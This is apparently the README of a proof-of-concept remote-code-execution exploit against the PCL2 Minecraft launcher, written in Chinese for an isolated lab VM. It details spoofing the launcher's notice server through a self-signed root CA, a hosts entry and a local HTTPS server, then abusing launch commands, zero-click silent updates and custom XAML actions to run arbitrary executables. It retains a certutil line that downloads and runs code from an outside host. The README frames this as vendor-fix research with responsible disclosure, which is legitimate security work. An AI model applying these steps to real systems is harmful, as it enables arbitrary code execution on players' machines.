# PCL2 `notice.json` RCE PoC（实验室内网）

> 仅用于授权的隔离 Windows VM。不要在真实用户/生产环境运行。
> 本 PoC 不修改 PCL 二进制；它通过“自签 CA + hosts + 本地 HTTPS”复现真实攻击面。

## 文件

```
poc/
├── server.ps1             纯 PowerShell HTTPS 伪造服务器（默认，无需 Python）
├── server.py              可选 Python 版服务器（-Server python 时使用）
├── Invoke-PCLPoC.ps1      Windows 一键脚本（需管理员）
├── certs/                 可选 Python 模式使用的 PEM 证书
├── www/                   运行时可写目录（update.zip 在这里生成）
└── README.md
```

默认走 **纯 PowerShell 服务端**（`TcpListener` + `SslStream`），不需要安装 Python；
只有在 `-Server python` 时才需要 Python 3。

## 模式

| 模式 | notice.json 动作 | 触发方式 | 说明 |
|---|---|---|---|
| `launch` | `setup.LaunchAdvanceRun = <payload>` | 在 PCL 点“启动游戏” | 复现需求方样本；需要可用 MC 实例 |
| `update` | `slientupdate` + `ServerConfig.DownloadUrls` | PCL 启动后正常关闭 | **零点击**；任意 zip → 任意 exe |
| `xaml` | `setup.UiCustomType/UiCustomNet/HintCustomCommand` | 第二次启动点页面按钮 | 远程自定义主页 + 自定义事件 |
| `both` | `launch` + `update` | 关闭 PCL 即触发 | 默认 |

## 前置条件

- Windows 10/11 隔离 VM；
- PCL2 2.99.0.0（本仓库根目录的 `Plain Craft Launcher 2.exe`）；
- Python 3 仅在 `-Server python` 时需要；默认 `-Server auto` 使用纯 PowerShell 服务端，不需要 Python；
- 管理员 Windows PowerShell 5.1（Windows 10/11 自带；`powershell.exe`）。
  脚本已做成**纯 ASCII + CRLF**，避免 5.1 把无 BOM 的 UTF-8 当 ANSI/GBK 读而报
  “字符串缺少终止符”/“缺少右 }”；
  脚本不要求 PowerShell 7；即使从 `pwsh` 启动，也会自动切回 5.1，
  因为 `Add-Type -OutputType ConsoleApplication` 在 pwsh 7 下不可用。
- `launch` 模式需要一个能启动的 Minecraft 版本；
- 先手动启动一次 PCL，接受 EULA/初始化，然后完全关闭（避免首启弹窗/单实例卡住 PoC）；
- 确保 VM 系统时间正确（证书有效期 2026-2036）；
- 修改 hosts 后脚本会执行 `ipconfig /flushdns`；如果仍解析到真实 CDN，手动再刷新一次；
- 确保 Windows 没有系统代理，或在 IE/WinHTTP 代理中排除
  `pcl2-server-1253424809.file.myqcloud.com`；否则 .NET 可能把请求发给代理，
  而不是 hosts 指向的 127.0.0.1；
- 脚本为了改 hosts/证书会以管理员身份运行，因此它启动的 PCL 也是管理员令牌；
  真实攻击中 PCL 以当前用户权限运行，效果相同，但这不是提权漏洞。

## 直接用计算器（最小变体）

`server.py` 的 `launch` 模式默认让 `LaunchAdvanceRun` 指向 payload（写 marker + 计算器）。
如果只想复现“计算器弹出”，可以用 `poc/samples/notice.launch.calc.json` 的内容，
把 `LaunchAdvanceRun` 改成 `start calc.exe`，或直接运行：

```powershell
python .\server.py --mode launch --port 443 --payload-exe "C:\Windows\System32\calc.exe"
```

此时 `LaunchAdvanceRun` 就是 `calc.exe`，PCL 点击“启动游戏”后执行
`cmd.exe /c "C:\Windows\System32\calc.exe"`。

## 复现需求方原始 certutil 样本

`poc/samples/notice.launch.certutil.json` 保留了原始的
`start /b cmd /c "certutil ... http://192.168.1.144:8084/swt ..."`。
使用时：

1. 在 `192.168.1.144:8084` 起一个 HTTP 服务，放 `swt`（内容为
   `run.bat` 的下载地址或直接是批处理）和 `run.bat`；
2. 把该 JSON 作为 `notice.json` 返回（可改 `server.py` 的 `build_notice`）；
3. PCL 启动后点击“启动游戏”，`McLaunchCustom` 会执行 `cmd /c`——
   注意这不是 PCL 启动即执行，而是游戏启动流水线的一环。

如果只想看计算器，直接用 `Invoke-PCLPoC.ps1 -Mode launch` 即可。

## 手动模式（推荐：用你自己的 PCL，自己关闭）

如果不想让脚本自动启动/关闭 PCL，加 `-Manual`：

```powershell
cd C:\Users\MiRin\Desktop\PCLPoC\poc

powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 `
  -Mode update `
  -Manual `
  -PclPath "C:\Users\MiRin\Desktop\PCLPoC\Plain Craft Launcher 2.exe"
```

`-PclPath` 可以完全省略：脚本不启动、不关闭、也不读取你的 PCL 目录：

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 `
  -Mode update `
  -Manual
```

脚本只做：

1. 生成/信任实验室 CA；
2. 改 hosts + flush DNS；
3. 起本地 HTTPS 服务端；
4. 打印操作提示，然后**等你按 Enter**。

> 不传 `-PclPath` 时脚本不会备份/恢复 `PCL\Setup.ini`，也不会清理
> `<你的PCL>\PCL\Plain Craft Launcher 2.exe` staging；公告对 PCL 设置的修改会留在
> 你用的那份 PCL 里。建议用一份可丢弃的 PCL 副本，或传 `-PclPath` 让脚本备份/清理。

PCL 由你自己启动、自己关闭：

- `update`：启动 PCL，等
  `<PCL目录>\PCL\Plain Craft Launcher 2.exe` 出现，然后正常关闭 PCL；
  计算器弹出后，回到脚本窗口按 Enter。
- `launch`：启动 PCL，点“启动游戏”，计算器弹出后关闭 PCL，再按 Enter。
- `xaml`：启动 PCL，等约 20 秒关闭；再启动，点页面 `Continue`；
  关闭后按 Enter。

按 Enter 后脚本才校验 marker、清理 hosts/证书/staging。这样你可以：

- 用自己已经配置好的 PCL（登录、版本、设置都不动）；
- 自己控制什么时候启动、什么时候关闭；
- 在关闭 PCL 前继续观察日志/抓包。

注意：`-Manual` 不会自动关 PCL，所以清理前请先自己把 PCL 关掉，避免它还在请求时
hosts/证书被还原。

## 一键运行

```powershell
# 管理员 PowerShell
cd <PCL目录>\poc
powershell -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 -Mode update
```

脚本会：

1. 备份 hosts / `PCL\Setup.ini` / `HKCU\Software\PCL` / 更新 staging；
2. 把 `certs\ca.crt` 装进 `Cert:\LocalMachine\Root`；
3. 把 `pcl2-server-1253424809.file.myqcloud.com` 指向 `127.0.0.1`；
4. 用 `Add-Type` 编译 payload（写 `%TEMP%\pcl-poc-marker.txt` + 启动 `calc.exe`）；
5. 启动 `server.py`（HTTPS 443）；
6. 启动 PCL；
7. `update`/`both`：等待 `PCL\Plain Craft Launcher 2.exe` 出现，关闭 PCL；
   `launch`：提示你点“启动游戏”；
   `xaml`：第一次启动写设置并关闭，第二次启动等 `Cache\Custom.xaml`，提示点 `Continue`；
8. 校验 marker / `calc.exe`；
9. 清理 hosts、根证书、PCL 注册表、staging、payload。

## 手动分步

```powershell
# 1. 信任 CA
Import-Certificate .\certs\ca.crt -CertStoreLocation Cert:\LocalMachine\Root

# 2. hosts
Add-Content $env:SystemRoot\System32\drivers\etc\hosts `
  "`r`n127.0.0.1 pcl2-server-1253424809.file.myqcloud.com"

# 3. 起服务（payload 需提前放好）
python .\server.py --mode update --port 443 --payload-exe C:\Users\Public\pclpoc.exe

# 4. 启动 PCL，等 PCL\Plain Craft Launcher 2.exe 出现，正常关闭 PCL

# 5. 清理
#    - 删除 hosts 中的那行
#    - Remove-Item Cert:\LocalMachine\Root\<thumbprint>
#    - 删除 PCL\Plain Craft Launcher 2.exe staging
#    - 删除 %TEMP%\PCL\Cache\{Notice.json,notice.cfg,ServerConfig.json,Custom.xaml}
```

## 预期结果

`update` 模式：

- `server.py` 收到 `/notice.cfg`、`/ServerConfig.json`、`/notice.json`、`/update.zip`；
- `<PCL目录>\PCL\Plain Craft Launcher 2.exe` 出现（payload）；
- 关闭 PCL 后 `calc.exe` 启动；
- `%TEMP%\pcl-poc-marker.txt` 出现，内容类似：
  ```
  2026-10-21T23:45:12.3456789+08:00 pid=1234 args=--update 5678 "Plain Craft Launcher 2.exe" ...
  ```

`launch` 模式：

- PCL 日志出现 `正在执行全局自定义命令：...`；
- 点击“启动游戏”后 `calc.exe` 启动，marker 出现。

`xaml` 模式：

- 第二次启动后 `%TEMP%\PCL\Cache\Custom.xaml` 出现；
- 点击 `Continue` 后 `calc.exe` 启动；
- PCL 日志出现 `执行自定义事件：执行命令, ...`。

## Python 是 Microsoft Store 别名 / 443 起不来（仅 `-Server python`）

如果 `poc-run.log` 里是：

```text
Python: C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\python.exe
[-] ERROR: PoC server did not listen on port 443.
```

说明 `python.exe` 是微软商店的占位别名，不是真 Python，`server.py` 没有跑起来。
如果你没有显式加 `-Server python`，默认不会走 Python，根本不会出现这个问题。
脚本现在会跳过 `WindowsApps` 别名，优先找 `py.exe` / `python3.exe`；但如果机器上
没有真 Python，会直接报：

```text
No real Python 3 found. ...
```

任选一种安装：

```powershell
winget install -e --id Python.Python.3.12
# 或从 https://www.python.org/downloads/windows/ 安装，勾选 "Add python.exe to PATH"
```

安装后**重新打开**管理员 PowerShell，先验证：

```powershell
py -3 --version
python --version
```

然后重跑；如果 PATH 里 `python` 仍是商店别名，显式指定：

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 `
  -Mode update `
  -Pause `
  -PclPath "C:\Users\MiRin\Desktop\PCLPoC\Plain Craft Launcher 2.exe" `
  -PythonExe "C:\Users\MiRin\AppData\Local\Programs\Python\Python312\python.exe"
```

也可以直接看 `poc\backup\server.err.log`，现在失败时会把最后 30 行一起打印出来。

## 窗口一闪而过 / 看不到输出

这是自提权的正常现象：脚本用 `Start-Process powershell.exe -Verb RunAs` 开了**新的
管理员控制台**，脚本跑完或报错后这个窗口就关闭，原窗口也可能已经退出。

三种办法：

1. **先手动开管理员 PowerShell**，再执行脚本（已经是管理员就不会再开新窗口）：

   ```powershell
   # Win+X -> Windows PowerShell (管理员) / Terminal (管理员)
   cd C:\Users\MiRin\Desktop\PCLPoC\poc
   powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 -Mode update
   ```

2. 加 `-Pause`，脚本结束/报错时停在 `Press Enter to close`：

   ```powershell
   powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\Invoke-PCLPoC.ps1 -Mode update -Pause
   ```

   自提权时 `-Pause` 会一起传给新的管理员窗口。

3. 直接看日志（窗口关了也不影响）：

   ```text
   poc\poc-run.log
   poc\backup\server.out.log
   poc\backup\server.err.log
   ```

如果日志最后一行是 `Done.`，说明脚本正常结束；如果停在某一步，把那几行发我。

## 调试

- 服务端日志：`poc/backup/server.out.log`、`server.err.log`
- PCL 日志：`<PCL目录>\PCL\Log1.txt` ... `Log5.txt`
- 如果 PCL 没有请求公告：
  - 确认 hosts 生效：`ping pcl2-server-1253424809.file.myqcloud.com` → `127.0.0.1`；
  - 确认 CA 已装进 `LocalMachine\Root`；
  - 确认 443 没有被其它程序占用：`netstat -ano | findstr :443`；
  - 确认 `HKCU\Software\PCL\HintNotice` 被重置为 0（脚本会做）；
  - 确认 `PCL\Setup.ini` 中 `SystemSystemActivity` 不大于 99（脚本的 notice 用
    `importantLevel=99`）。
- 如果 `Add-Type` 编译 payload 失败，脚本会回退到复制 `calc.exe`；此时只能看
  `calc.exe` 是否启动，没有 marker。
- 如果 PCL 首次启动弹 EULA/更新提示，先手动处理，再重跑。

## 安全边界

- 只在隔离 VM、断网或 NAT 实验网中运行；
- 不要把这个 CA 私钥/证书带到真实环境；
- 脚本会修改 hosts 和根证书存储，务必让 `finally` 清理逻辑执行完；
- 不要在真实用户机器上测试 `update` 模式：它会覆盖
  `<PCL目录>\PCL\Plain Craft Launcher 2.exe` 并执行任意 exe。

## 法律/披露

本 PoC 仅用于安全研究与厂商修复验证。发现的问题建议先私下联系
`admin@meloong.com` / GitHub Security Advisory，给厂商修复窗口后再公开。
